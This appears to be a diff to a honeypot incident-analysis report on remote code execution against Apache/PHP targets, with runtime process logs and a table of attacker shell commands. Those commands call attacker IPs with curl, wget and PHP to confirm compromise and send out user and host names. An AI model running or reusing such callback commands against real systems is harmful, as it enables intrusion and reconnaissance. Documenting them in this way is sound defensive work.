@@ -108,7 +108,7 @@ The first T2 chain shows the same transition with a different command:
 16:46:58.166  162.35.99.94:47720  B2 POST /index.php; complete 451,384-B body
 16:46:59.197  Tetragon: apache2 → /bin/sh, UID 33
 16:46:59.201  Tetragon: /bin/sh → /usr/local/bin/php -r ...
-16:47:59      PHP CLI: file_get_contents(http://162.35.99.94:8080/pwn-[target]) timed out
+16:47:59      PHP CLI: file_get_contents(http://162.35.99.94:8080/pwn-[T2-honeypot-IP]) timed out
 16:47:59.530  Apache: worker exited on Segmentation fault (11)
 ```
 
@@ -116,17 +116,34 @@ Later T2 shells used `curl` and `wget` variants. For example, at 16:50:49 Tetrag
 
 ### Selected runtime records
 
-These normalized records show the process lineage and command changes. The `[target]` token replaces a target address embedded by the attacker in its callback path; the callback destination itself remains visible.
+These normalized records retain the observed command content, including proof paths. `[T1-honeypot-IP]` through `[T3-honeypot-IP]` replace addresses of the three targets, not the attacker endpoints. PHP and Apache lines are correlated by the request window; Tetragon records process parentage directly.
 
 ```text
+T1 15:35:33      php_error     Allowed memory size of 134217728 bytes exhausted
+   (tried to allocate 4096 bytes) in Unknown on line 0
+T1 15:35:36      php_error     PHP Request Startup: Session ID is too long or contains illegal characters
 T1 15:35:38.673  process_exec  apache2 → /bin/sh  uid=33
    args: id>/tmp/x1; for d in /var/www/html /var/www; do id>$d/p1; done;
          wget -q http://15.204.59.70:8081/ok33
+T1 15:35:38.674  process_exec  /bin/sh → /usr/bin/id  uid=33
+T1 15:35:38.676  security_file_permission  /tmp/x1  return=0
+T1 after B2       Apache stderr  web-root proof writes: Read-only file system; wget: not found
 T2 16:46:59.197  process_exec  apache2 → /bin/sh → /usr/local/bin/php
-   args: php -r 'file_get_contents("http://162.35.99.94:8080/pwn-[target]");'
+   args: php -r 'file_get_contents("http://162.35.99.94:8080/pwn-[T2-honeypot-IP]");'
+T2 16:46:59.268  tcp_connect   /usr/local/bin/php → 162.35.99.94:8080
+   state=TCP_SYN_SENT; return=0
+T2 16:47:59      php_error     file_get_contents(...): Failed to open stream: Connection timed out
 T2 16:50:49.133  process_exec  apache2 → /bin/sh → /usr/bin/curl
-   args: curl -s http://162.35.99.94:8080/pwn-[target] >/dev/null
+   args: curl -s http://162.35.99.94:8080/pwn-[T2-honeypot-IP] >/dev/null
 T2 16:50:49.153  tcp_connect   /usr/bin/curl → 162.35.99.94:8080
+   state=TCP_SYN_SENT; return=0
+T3 17:27:25.919  process_exec  apache2 → /bin/sh  uid=33
+   args: wget -q -O- http://162.35.99.94:80/pwn-[T3-honeypot-IP]
+T3 after B2       Apache stderr  sh: 1: wget: not found
+T3 18:08:20.091  process_exec  apache2 → /bin/sh  uid=33
+   args: curl -s "http://162.35.99.94:80/ID-$(id -un)-$(hostname)-$(uname -m)"
+T3 18:08:20.093–.102  process_exec  /bin/sh → id -un, hostname, uname -m, curl
+T3 18:08:20.116  tcp_connect   /usr/bin/curl → 162.35.99.94:80
    state=TCP_SYN_SENT; return=0
 ```
 
@@ -180,6 +197,29 @@ Every row below has a complete 451,384-B B2 request in target-side PCAP immediat
 | B32 | 18:57:29.320 | `162.35.99.94` | T1 | 36458 | same command as B31 | T1/595:32 |
 
 Some final requests have no completed Apache access entry because their worker crashed; the packet flow and process event provide the evidence for those rows. Successful RCE is **not** inferred from a PHP OOM, a `PHPSESSID` alone, or `AH00051` alone. The decisive difference is the unexpected Apache-parent shell, followed in several cases by independently observed `id`, PHP CLI, or `curl` child processes.
+
+### Complete observed shell commands
+
+Tetragon captured one Apache-parent `/bin/sh` event for each case above. These are the 14 distinct original commands after the shell's `-c --` wrapper; each case maps to exactly one row. Embedded target addresses are replaced with the corresponding `[T1-honeypot-IP]`, `[T2-honeypot-IP]`, or `[T3-honeypot-IP]` label; other command text is retained. The execution-stage HTTP payload is the corresponding 451,384-byte B2 body, indexed by SHA-256 below.
+
+| Cases | Observed command |
+|---|---|
+| A01–A03 | `id>/tmp/x1;for d in /var/www/html /var/www;do id>$d/p1;done;wget -q http://15.204.59.70:8081/ok33` |
+| B01–B03 | `php -r 'file_get_contents("http://162.35.99.94:8080/pwn-[T2-honeypot-IP]");'` |
+| B04–B05 | `curl -s http://162.35.99.94:8080/pwn-[T2-honeypot-IP] >/dev/null` |
+| B06, B11, B13–B15 | `curl -s http://162.35.99.94:80/pwn-[T2-honeypot-IP]` |
+| B07–B08 | `wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]` |
+| B09–B10 | `php -r 'file_get_contents("http://162.35.99.94:80/pwn-[T2-honeypot-IP]");'` |
+| B12 | `wget -q -O- http://162.35.99.94:80/pwn-[T3-honeypot-IP]` |
+| B16 | `curl -s http://162.35.99.94:80/PROOF-$(id -un)-$(hostname)` |
+| B17–B20 | `curl -s "http://162.35.99.94:80/ID-$(id -un)-$(hostname)-$(uname -m)"` |
+| B21–B25, B27 | `curl -s http://162.35.99.94:80/ID-$(id -un)-$(hostname)` |
+| B26 | `curl -s http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)` |
+| B28–B29 | `wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)` |
+| B30 | `curl -s http://162.35.99.94:80/pwn-[T1-honeypot-IP]-$(id -un)` |
+| B31–B32 | `wget -q -O- http://162.35.99.94:80/pwn-[T1-honeypot-IP]-$(id -un)` |
+
+Apache logged `sh: 1: wget: not found` for the `wget` commands; `/ok33` was observed in the command line, not recovered as a fetched file. Tetragon recorded `id`, PHP CLI, and `curl` child processes; the PHP CLI request timed out. No downloaded second-stage file was observed in the reviewed evidence.
 
 ### Execution-stage body digests
 
